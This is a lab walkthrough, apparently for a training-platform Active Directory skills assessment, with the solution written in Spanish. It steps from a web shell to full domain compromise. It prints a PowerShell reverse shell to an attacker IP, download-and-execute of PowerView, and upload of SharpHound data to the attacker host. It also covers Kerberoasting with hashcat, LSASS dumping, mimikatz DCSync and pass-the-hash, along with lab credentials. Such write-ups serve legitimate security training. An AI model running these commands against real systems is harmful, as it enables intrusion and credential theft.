# AD Enumeration & Attacks - Skills Assessment Part I

## Scenario
A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

## Solución
### Submit the contents of the flag.txt file on the administrator Desktop of the web server
- Accedemos `http://10.129.202.242/uploads/antak.aspx` con las credenciales dadas, obteniendo una webshell. Podemos encontrar la primera flag escribiendo lo siguiente: 
    ```bash
    type C:\Users\Administrator\Desktop\flag.txt
    ```

- Creamos una webshell
    - máquina víctima
        ```powershell
        $client = New-Object System.Net.Sockets.TCPClient('10.10.14.116',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        ```
    - pwnbox
        ```bash
        rlwrap nc -nlvp 4444        
        ```

### Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer

- Cargamos las funciones del módulo `powerview` en memoria: 
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.116:8000/powerview.ps1')
    ```

- Mostramos el `spn` y `samaccountname` de las cuentas susceptibles de kerberoasting
    ```Get-DomainUser * -spn | select serviceprincipalname,samaccountname               │pwdlastset            : 3/30/2022 2:14:52 AM
    serviceprincipalname                        samaccountname      
    --------------------                        --------------      
    adfsconnect/azure01.inlanefreight.local     azureconnect        
    backupjob/veam001.inlanefreight.local       backupjob           
    kadmin/changepw                             krbtgt              
    MSSQLSvc/DEVTEST.inlanefreight.local:1433   sqltest             
    MSSQLSvc/QA001.inlanefreight.local:1433     sqlqa               
    MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 sqldev              
    MSSQLSvc/SQL01.inlanefreight.local:1433     svc_sql             
    MSSQLSvc/SQL02.inlanefreight.local:1433     sqlprod          
    ```
    Encontrando que el nombre que nos piden es `svc_sql`

- Generamos un ticket para este servicio
    ```powershell
    Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
    ```
- Guardamos el contenido del ticket con el nombre `ticket_svc_sql` y lo craqueamos offline del siguiente modo: 
    ```bash
    hashcat -m 13100 ticket_svc_sql /usr/share/wordlists/rockyou.txt
    ```
    obteniendo como contraseña del servicio `lucky7`

### Submit the contents of the flag.txt file on the Administrator desktop on MS01

- En este punto, dado que tenemos acceso al dominio, decidimos descargar `sharphound.exe` y volcar la información del dominio. Creamos un python server en nuestra pwnbox y en la máquina comprometida ejecutamos
    ```powershell
    Invoke-WebRequest http://10.10.14.116:8000/SharpHound.exe -OutFile sharphound.exe
    ```

- A continuación volcamos la información del domino
    ```powershell
    .\SharpHound.exe -c all, Group --zipfilename dominioInlaneFreight
    ```
- Creamos un python uploadserver en nuestra pwnbox y en la máquina comprometida escribimos lo siguiente para volcar el archivo
    ```powershell
    Invoke-FileUpload -Uri http://10.10.14.116:8000/upload -File C:\windows\system32\inetsrv\descargas\20250109022905_dominioInlaneFreight.zip
    ```
    lo que nos permite tener una representación visual del dominio

- Tratamos de conectarnos por RDP a MS01 del siguiente modo: 
    - Comprobamos con `nslookup ms01` que la dirección ip de ms01 es `172.16.6.50`
    - Redirigimos el tráfico que entre por el puerto `33389` de la máquina comprometida a MS01 coon `netsh`
        ```powershell
        netsh interface portproxy add v4tov4 listenport=33389 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.6.50
        ``` 
    - Nos conectamos desde rdp con nuestra pwnbox del siguiente modo: 
        ```bash
        xfreerdp /v:$target /u:'inlanefreight\svc_sql' /p:'lucky7' /drive:Shared,/tmp /port:33389
        ```
        obteniendo la flag

### Find cleartext credentials for another domain user. Submit the username as your answer.

- Volcamos lsa.dmp del siguiente modo:
    ```powershell
    Get-Process lsass
    # obtenemos proceso 676
    rundll32 C:\windows\system32\comsvcs.dll, MiniDump 676 C:\lsass.dmp full
    ```

- Dado que tenemos una carpeta compartida con nuestro sistema, podemos mover el archivo y ejecutar `pypykatz.py` sobre el

- De esta manera no obtenemos credenciales en texto claro, por lo que intentamos extraer credenciales con `mimikatz`del siguiente modo
    ```powershell
    mimikatz.exe privilege::debug sekurlsa::logonpasswords > output.txt
    ```

- Aquí aparece la contraseña `Sup3rS3cur3D0m@inU2eR` para `tpetty`. Tenemos por lo tatno las siguientes credenciales:  `tpetty:Sup3rS3cur3D0m@inU2eR`

### What attack can this user perform?

- Comprobamos con bloodhound que este usuario tiene permisos de `DCSYnc`

###  Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01

- Nos abrimos una nueva ps como si fueramos el usuario `tpetty`
    ```powershell
    runas /user:INLANEFREIGHT\tpetty powershell.exe 
    ```
- Utilizamos mimikatz nuevamente para hacer un volcado DCSync
    ```powershell
    ./mimikatz.exe
    lsadump::dcsync /domain:inlanefreight.local /user:inlanefreight\administrator
    ```

- Encontramos el siguiente hashNT: `27dedb1dab4d8545c6e1c66fba077da0`

- Hacemos un pth con este hash usando mimikatz: 
    ```powershell
     sekurlsa::pth /user:Administrator /domain:inlanefreight.local /ntlm:27dedb1dab4d8545c6e1c66fba077da0 /run:cmd.exe
    ```
- Y podemos acceder al contenido del dc del siguiente modo: 
    ```powershell
    type \\DC01\C$\Users\Administrator\Desktop\flag.txt
    ```